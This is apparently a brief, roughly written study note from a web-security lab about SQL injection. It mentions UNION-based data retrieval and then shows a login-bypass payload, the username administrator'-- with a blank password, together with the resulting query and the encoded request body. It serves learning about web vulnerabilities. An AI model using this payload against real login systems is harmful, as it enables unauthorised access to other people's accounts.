In cases where the results of a SQL query are returned within the application's responses, an attacker can leverage a SQL injection vulnerability to retrieve data from other tables within the database. This is done using the `UNION` keyword, which lets you execute an additional `SELECT` query and append the results to the original query.

if login

`SELECT * FROM users WHERE userne = 'wiener' AND password = 'bluecheese'`

works try ```


```
submitting the userne administrator'-- and a blank password

```sql
SELECT * FROM users WHERE userne = 'administrator'--' AND password = ''
```

```
in repeater at login
userne=administrator%27--&password=%27%27
```
